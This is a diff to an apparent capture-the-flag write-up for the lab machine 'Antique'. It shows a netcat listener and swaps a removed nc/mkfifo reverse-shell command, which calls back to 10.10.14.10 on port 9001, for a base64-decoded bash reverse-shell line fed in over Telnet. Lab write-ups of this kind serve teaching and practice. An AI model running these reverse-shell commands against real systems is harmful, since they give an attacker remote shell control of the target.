@@ -321,15 +321,15 @@ First, I'll setup a listener to receive the shell.
 ❯ rlwrap nc -lvnp "9001"
 ```
 
-Then, I'll choose the 'nc mkfifo' payload from
+Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
 [RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
 shell.
 
-Therefore, after logging in to Antique over Telnet, the command we should enter to
-execute our reverse shell payload is:
+Therefore, after logging in to Antique over Telnet, the command we should enter
+to execute our reverse shell payload is:
 
 ```sh
-exec "/bin/bash" -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.10 9001 >/tmp/f"
+exec "/bin/bash" -c "/bin/echo <BASE64_REVSHELL_PAYLOAD> | /usr/bin/base64 -d | /bin/bash -i"
 ```
 
 Let's try it in practice.
@@ -521,6 +521,8 @@ antique
 ```
 
 Yeah I know, very surprising.
+
+## System enumeration
 
 ### Flags
 
